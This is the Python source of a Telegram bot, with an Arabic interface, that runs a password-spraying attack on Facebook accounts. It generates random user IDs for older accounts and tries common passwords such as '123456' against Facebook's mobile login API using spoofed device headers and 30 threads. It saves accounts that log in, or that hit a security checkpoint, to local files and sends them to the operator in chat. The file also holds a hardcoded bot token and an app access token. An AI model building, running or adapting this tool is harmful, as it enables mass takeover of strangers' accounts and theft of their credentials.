import asyncio, random, re, os, time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import requests
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from aiogram.filters import Command
from aiogram.enums import ParseMode

TOKEN = "7792196548:AAHaWkIJXqnWxj51IJm0SI4_DWDpiMOCfiU"
ADMIN_IDS = {6936293942}  # your telegram id(s)

# -----------------------------[ COLORS / UI ]-----------------------------
def banner():
    return (
        "<b>◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉</b>\n"
        "<b>⚡ بيكو بوت — صيد فيسبوك ⚡</b>\n"
        "<b>◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉</b>"
    )

def main_kb():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, keyboard=[
        [KeyboardButton(text="🎯 صيد 2009"), KeyboardButton(text="🎯 صيد 2010")],
        [KeyboardButton(text="📊 الإحصائيات"), KeyboardButton(text="⚙️ الإعدادات")],
        [KeyboardButton(text="⛔ إيقاف الصيد")]
    ])
    return kb

# -----------------------------[ CRACK ENGINE ]-----------------------------
class CrackEngine:
    def __init__(self):
        self.running = False
        self.stop_flag = False
        self.ok = 0
        self.cp = 0
        self.loop = 0
        self.total = 0
        self.start_time = None
        self.last_edit = 0
        self.ok_file = None
        self.cp_file = None

    def gen_ids_2009(self, limit):
        x, xx, idx = 111111111, 999999999, "100000"
        return [idx + str(random.randint(x, xx)) for _ in range(limit)]

    def gen_ids_2010(self, limit):
        x, xx, idx = 1111111111, 9999999999, "10000"
        return [idx + str(random.randint(x, xx)) for _ in range(limit)]

    def crack_one(self, uid, passwords):
        if self.stop_flag:
            return None
        ua = random.choice([
            "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68]",
            "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
            "Mozilla/5.0 (Linux; Android 9; SM-N950U Build/PPR1.180610.011) AppleWebKit/537.36 Chrome/71.0.3578.99 Mobile Safari/537.36"
        ])
        headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
            "x-fb-sim-hni": str(random.randint(20000, 40000)),
            "x-fb-net-hni": str(random.randint(20000, 40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua,
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"
        }
        for pw in passwords:
            if self.stop_flag:
                return None
            pw = pw.strip().lower()
            if len(pw) < 6:
                continue
            try:
                url = ("https://b-api.facebook.com/method/auth.login?format=json"
                       f"&email={uid}&password={pw}"
                       "&credentials_type=device_based_login_password&generate_session_cookies=1"
                       "&error_detail_type=button_with_disabled&source=device_based_login"
                       "&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET"
                       "&locale=en_US&client_country_code=US"
                       "&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                       "&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                       "&fb_api_req_friendly_name=authenticate&cpl=true")
                r = requests.get(url, headers=headers, timeout=15)
                txt = r.text
                if "session_key" in txt and "EAAA" in txt:
                    self.ok += 1
                    with open(self.ok_file, "a", encoding="utf-8") as f:
                        f.write(f"{uid}|{pw}\n")
                    return ("OK", uid, pw)
                elif '"error_msg"' in txt and "www.facebook.com" in txt:
                    self.cp += 1
                    with open(self.cp_file, "a", encoding="utf-8") as f:
                        f.write(f"{uid}|{pw}\n")
                    return ("CP", uid, pw)
            except Exception:
                time.sleep(2)
                continue
        return None

ENGINE = CrackEngine()

# -----------------------------[ BOT ]-----------------------------
bot = Bot(token=TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(m: Message):
    await m.answer(banner() + "\n\nأهلاً بك في <b>بيكو بوت</b> 🚀\nاختر من القائمة بالأسفل:", reply_markup=main_kb())

@dp.message(F.text == "🎯 صيد 2009")
async def hunt2009(m: Message):
    await ask_limit(m, year=2009)

@dp.message(F.text == "🎯 صيد 2010")
async def hunt2010(m: Message):
    await ask_limit(m, year=2010)

async def ask_limit(m: Message, year: int):
    if ENGINE.running:
        await m.answer("⚠️ يوجد صيد شغال حالياً، أرسل <b>⛔ إيقاف الصيد</b> أولاً.")
        return
    kb = ReplyKeyboardMarkup(resize_keyboard=True, keyboard=[
        [KeyboardButton(text="1000"), KeyboardButton(text="5000")],
        [KeyboardButton(text="10000"), KeyboardButton(text="50000")],
        [KeyboardButton(text="🔙 رجوع")]
    ])
    await m.answer(f"🎯 اختر عدد الايديات لصيد <b>{year}</b>:", reply_markup=kb)
    dp.message.register(limit_handler, F.text.regexp(r"^\d+$"), year=year)

async def limit_handler(m: Message, year: int):
    limit = int(m.text)
    if limit > 100000:
        await m.answer("❌ الحد الأقصى 100,000")
        return
    passwords = ["123456", "1234567", "12345678", "123456789", "112233", "123123"]
    await start_crack(m, year, limit, passwords)

async def start_crack(m: Message, year: int, limit: int, passwords: list):
    ENGINE.running = True
    ENGINE.stop_flag = False
    ENGINE.ok = ENGINE.cp = ENGINE.loop = 0
    ENGINE.total = limit
    ENGINE.start_time = time.time()
    ENGINE.ok_file = f"OK-{year}-{datetime.now():%Y%m%d-%H%M%S}.txt"
    ENGINE.cp_file = f"CP-{year}-{datetime.now():%Y%m%d-%H%M%S}.txt"
    ids = ENGINE.gen_ids_2009(limit) if year == 2009 else ENGINE.gen_ids_2010(limit)
    status = await m.answer("🚀 بدأ الصيد...", reply_markup=ReplyKeyboardRemove())
    loop = asyncio.get_running_loop()
    with ThreadPoolExecutor(max_workers=30) as ex:
        futures = [loop.run_in_executor(ex, ENGINE.crack_one, uid, passwords) for uid in ids]
        for fut in asyncio.as_completed(futures):
            if ENGINE.stop_flag:
                break
            res = await fut
            ENGINE.loop += 1
            if res:
                typ, uid, pw = res
                msg = (f"✅ <b>OK</b> | {uid} | {pw}" if typ == "OK"
                       else f"⚠️ <b>CP</b> | {uid} | {pw}")
                await m.answer(msg)
            if time.time() - ENGINE.last_edit > 3:
                ENGINE.last_edit = time.time()
                try:
                    await status.edit_text(
                        f"⏳ جاري الصيد <b>{year}</b>\n"
                        f"المعالجة: <b>{ENGINE.loop}/{ENGINE.total}</b>\n"
                        f"✅ OK: <b>{ENGINE.ok}</b> | ⚠️ CP: <b>{ENGINE.cp}</b>"
                    )
                except Exception:
                    pass
    ENGINE.running = False
    elapsed = int(time.time() - ENGINE.start_time)
    await status.edit_text(
        f"🏁 <b>انتهى الصيد</b>\n"
        f"⏱️ الوقت: {elapsed} ثانية\n"
        f"✅ OK: <b>{ENGINE.ok}</b>\n"
        f"⚠️ CP: <b>{ENGINE.cp}</b>\n"
        f"📁 الملفات: {ENGINE.ok_file} , {ENGINE.cp_file}",
        reply_markup=main_kb()
    )

@dp.message(F.text == "⛔ إيقاف الصيد")
async def stop_crack(m: Message):
    if not ENGINE.running:
        await m.answer("لا يوجد صيد شغال.", reply_markup=main_kb())
        return
    ENGINE.stop_flag = True
    await m.answer("🛑 تم إرسال أمر الإيقاف، انتظر ثواني...", reply_markup=main_kb())

@dp.message(F.text == "📊 الإحصائيات")
async def stats(m: Message):
    if ENGINE.running:
        await m.answer(
            f"⏳ صيد جارٍ...\nالمعالجة: {ENGINE.loop}/{ENGINE.total}\n✅ {ENGINE.ok} | ⚠️ {ENGINE.cp}",
            reply_markup=main_kb()
        )
    else:
        await m.answer("البوت خامل حالياً 🟢", reply_markup=main_kb())

@dp.message(F.text == "⚙️ الإعدادات")
async def settings(m: Message):
    await m.answer("⚙️ الإعدادات:\n- عدد الثريدات: 30\n- الملفات تُحفظ محلياً\n- توكن البوت مدمج في الكود", reply_markup=main_kb())

@dp.message(F.text == "🔙 رجوع")
async def back(m: Message):
    await m.answer(banner(), reply_markup=main_kb())

if __name__ == "__main__":
    dp.run_polling(bot)
